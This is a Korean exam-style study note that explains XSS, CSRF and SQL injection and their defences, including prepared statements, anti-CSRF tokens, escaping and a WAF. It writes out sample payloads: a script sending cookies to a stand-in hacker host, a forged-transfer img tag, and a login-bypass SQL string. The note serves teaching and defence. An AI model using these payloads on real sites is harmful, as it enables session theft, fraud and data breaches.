## 핵심 인사이트 (3줄 요약)
> 1. **본질**: 웹 애플리케이션의 3대장 해킹 기법으로, **XSS**는 남의 브라우저에서 스크립트를 실행시키는 것이고, **CSRF**는 사용자의 권한을 도용해 원치 않는 행동을 시키는 것이며, **SQL Injection**은 DB에 백도어 쿼리를 날려 데이터를 통째로 털어가는 기법이다.
> 2. **가치**: 이 3가지 취약점은 개발자가 사용자의 입력값(Input)을 "착한 데이터일 것이다"라고 순진하게 믿고 검증(Sanitization)하지 않았을 때 발생하는 가장 고전적이고 파괴적인 웹 보안 사고의 근원이다.
> 3. **판단 포인트**: XSS(프론트엔드 자바스크립트 공격)와 SQLi(백엔드 데이터베이스 공격)의 타깃 차이를 명확히 구분하고, 모든 방어의 제1원칙은 "사용자의 입력값을 절대로 믿지 말고 이스케이프(Escape) 치환하라"는 아키텍처 원칙을 증명해야 한다.

---

## Ⅰ. 개요 및 필요성
- **개요**: OWASP Top 10에 항상 랭크되는 웹 취약점들로, 게시판, 검색창, 로그인 폼 등 사용자가 데이터를 입력하는 통로(파라미터)를 악용하여 악의적인 스크립트나 데이터베이스 조작 쿼리를 주입하는 공격이다.
- **배경**: 웹 브라우저와 데이터베이스는 '<script>'나 'OR 1=1' 같은 문자열이 들어오면, 이게 단순한 '글씨'인지 아니면 '실행해야 할 명령어'인지 구분하지 못하는 태생적인 한계(기계의 수동성)가 있었다.
- **필요성**: 해커가 이 맹점을 이용해 남의 쿠키(세션)를 탈취하거나, 관리자 권한 없이 수천만 명의 개인정보 DB를 다운로드하는 대참사를 막기 위해, 웹 애플리케이션 레벨(L7)에서의 철저한 입력값 필터링 및 시큐어 코딩(Secure Coding) 체계가 정립되어야 했다.

## Ⅱ. 아키텍처 및 핵심 원리

### 1. XSS (Cross-Site Scripting) - "브라우저 공격"
- **원리**: 해커가 자유게시판에 `<script>document.location='http://해커서버.com/cookie?c='+document.cookie</script>` 라는 글을 쓴다. 일반 사용자가 이 글을 클릭하는 순간, 사용자 브라우저가 이 글을 '실행 가능한 코드'로 착각해 실행해 버리고, 사용자의 로그인 쿠키값이 해커 서버로 전송되어 계정이 털린다.
- **유형**: 게시판 DB에 저장되어 불특정 다수를 공격하는 **Stored XSS**, 검색창 등에서 반사되어 돌아오는 **Reflected XSS**.

### 2. CSRF (Cross-Site Request Forgery) - "권한 도용 공격"
- **원리**: 사용자가 이미 은행 사이트에 로그인되어 있는(쿠키가 살아있는) 상태를 노린다. 해커가 보낸 가짜 이메일의 사진을 클릭하는 순간, 몰래 뒤에서 `<img src="http://은행.com/송금?계좌=해커&금액=100만">` 코드가 실행된다. 은행 서버는 살아있는 사용자의 정상 쿠키가 같이 넘어오므로 의심 없이 해커에게 100만 원을 송금해 버린다.

### 3. SQL Injection - "데이터베이스 공격"
- **원리**: 로그인 창의 아이디 란에 `admin' OR '1'='1` 을 입력한다. 서버가 이를 받아 DB에 쿼리를 던질 때, `SELECT * FROM users WHERE id='admin' OR '1'='1' AND pw='비번'` 형태가 된다. 무조건 참(True)이 되는 마법의 수식(`1=1`) 때문에 비밀번호 검사가 무시되고 최고 관리자로 로그인이 뚫려버린다.

## Ⅲ. 비교 및 연결

| 비교 축 | XSS (크로스 사이트 스크립팅) | CSRF (크로스 사이트 요청 위조) | SQL Injection |
|:---|:---|:---|:---|
| **공격 대상 (Target)**| 사용자의 **웹 브라우저 (프론트엔드)** | 대상 웹 서버 (사용자 권한 악용) | **웹 서버의 DB (백엔드)** |
| **공격 수단** | 악성 자바스크립트(JavaScript) 삽입 | 정상적인 HTTP 요청(GET/POST) 위조 | 조작된 SQL 쿼리문 삽입 |
| **피해 결과** | 세션 쿠키 탈취, 악성코드 유포 | 비밀번호 변경, 강제 송금, 게시글 작성 | **DB 통째 탈취**, 관리자 계정 획득 |
| **핵심 방어책** | 특수문자 HTML 엔티티 치환 (Escape) | CSRF 토큰 검증, 재인증 요구 | **PreparedStatement (바인딩 변수)** 사용 |

> ※ **연결 포인트**: XSS와 CSRF는 보통 한 세트로 엮인다. 해커가 XSS를 이용해 사용자의 세션 쿠키를 훔쳐낸 뒤, 그 쿠키의 권한을 이용해 사용자가 원치 않는 행동(CSRF)을 백그라운드에서 실행시키는 연쇄 콤보가 가장 일반적인 해킹 시나리오다.

## Ⅳ. 실무 적용 및 기술사 판단

- **적용 사례 1 (SQLi 방어: Prepared Statement)**: 실무에서 개발자가 쿼리를 문자열 이어붙이기(`"SELECT * FROM tb WHERE id = " + inputId`)로 짜면 바로 징계를 받는다. 반드시 쿼리 뼈대(`WHERE id = ?`)를 먼저 DB에 컴파일시켜 고정해 둔 뒤, 사용자의 입력값은 절대 '명령어'가 아닌 단순한 '문자열 변수'로만 들어가게 묶어버리는 Prepared Statement 방식을 전면 적용하여 SQLi의 싹을 자른다.
- **적용 사례 2 (CSRF 방어: Anti-CSRF Token)**: 은행 송금 폼을 띄워줄 때 서버가 임의의 난수(Token: "x8F9z")를 화면에 몰래 숨겨서(Hidden) 보낸다. 송금 버튼을 누를 때 이 토큰이 같이 와야만 승인된다. 해커가 CSRF 공격을 위해 밖에서 위조 링크를 쏠 때는 이 1회용 토큰 값을 알 수 없으므로, 서버가 "토큰이 없거나 틀림!"이라며 송금을 튕겨버린다.
- **기술사 판단**: 이 3가지 취약점은 개발자 1명의 실수로도 뚫린다. 아키텍트는 개발자 개인의 주의에 의존하지 말고, 프레임워크 단(Spring Security, React 등)에서 특수문자(`<, >`)를 `&lt;` `&gt;`로 자동 변환(Sanitization/Escape)해 주도록 글로벌 필터를 세팅해야 한다. 또한 서버 앞단에 **웹 방화벽(WAF)**을 두어, `<script>`나 `UNION SELECT` 같은 명백한 공격 문자열이 들어오면 앱 서버에 도달하기도 전에 네트워크 단에서 컷(Drop) 시키는 다계층 방어(Defense in Depth)를 구현해야 한다.

---

## Ⅴ. 기대효과 및 결론

- **기대효과**: 입력값 검증과 출력값 필터링이라는 시큐어 코딩(Secure Coding) 원칙을 준수함으로써, 기업의 가장 치명적인 개인정보 유출 사고와 서비스 권한 탈취를 비용 효율적으로 사전 차단한다.
- **향후 발전 방향**: 최근 현대적인 프론트엔드 프레임워크(React, Vue, Angular)는 자체적으로 XSS 이스케이프 처리를 완벽하게 지원하여 고전적인 XSS가 많이 줄었다. 하지만 해커들은 멈추지 않고 JSON API의 취약점을 파고들거나, 오픈소스 라이브러리의 취약점(Supply Chain Attack)을 노리는 형태로 웹 공격을 끝없이 고도화하고 있다.

### 📌 관련 개념 맵
- **Same-Origin Policy (SOP, 동일 출처 정책)**: 자바스크립트가 다른 도메인(해커 사이트)으로 사용자의 데이터를 몰래 빼돌리지 못하도록, 브라우저 차원에서 "같은 도메인끼리만 통신해라!"라고 막아버리는 웹의 가장 기본적인 보안 헌법.
- **Blind SQL Injection**: DB가 에러 메시지(테이블 구조 등)를 화면에 안 보여줘도, 해커가 "비밀번호 첫 글자가 A냐?"라고 물어보고 서버가 늦게 반응하는지(Time-based) 참/거짓 반응하는지(Boolean-based)를 보며 스무고개 하듯 DB를 한 글자씩 털어가는 악랄한 수법.

### 📈 관련 키워드 및 발전 흐름도
`웹 1.0 (정적 페이지)` $\to$ `웹 2.0 (동적 게시판, XSS/SQLi 등장)` $\to$ `시큐어 코딩 의무화 / WAF 도입` $\to$ `프레임워크 자체 보안(React, Spring)` $\to$ `서버리스/API 취약점 시대로 전환`

### 👶 어린이를 위한 3줄 비유 설명
1. **XSS**: 게시판에 투명 망토를 쓴 '나쁜 요정'을 붙여둔 거예요. 친구가 게시물을 클릭하는 순간 요정이 튀어나와 친구 주머니의 열쇠(쿠키)를 훔쳐 도망가요!
2. **CSRF**: 제가 로그인한 은행 창구를 열어두고 잠깐 뒤돌아본 사이, 도둑이 제 손을 강제로 잡고 "해커에게 100만 원 송금해!"라는 서류에 몰래 지장을 찍게 만드는 짓이에요.
3. **SQL Injection**: 아이디 칸에 "홍길동"이라고 안 적고 "내 아이디는 홍길동이고, 금고 비밀번호 검사는 무시하고 문 열어라!"라는 최면 마법 주문을 써서 컴퓨터 금고를 통째로 털어버리는 수법이랍니다!
